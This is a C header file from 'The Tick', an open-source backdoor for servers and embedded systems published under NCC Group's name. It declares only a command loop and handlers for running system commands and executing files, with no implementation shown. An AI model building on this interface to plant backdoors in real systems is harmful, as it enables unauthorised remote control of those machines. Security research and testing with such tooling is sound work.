/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifndef COMMAND_H
#define COMMAND_H

#include "common.h"
#include "parser.h"

// Main function.
int command_loop(Parser *p);

// Helper functions.
int run_simple_command(const char *command, char *buffer, const size_t count);

// Basic command implementations are here.
// There are more command implementations in other modules.
// They are separated like this for conditional linking.
void do_system_fork(Parser *p);
void do_file_exec(Parser *p);

#endif /* COMMAND_H */
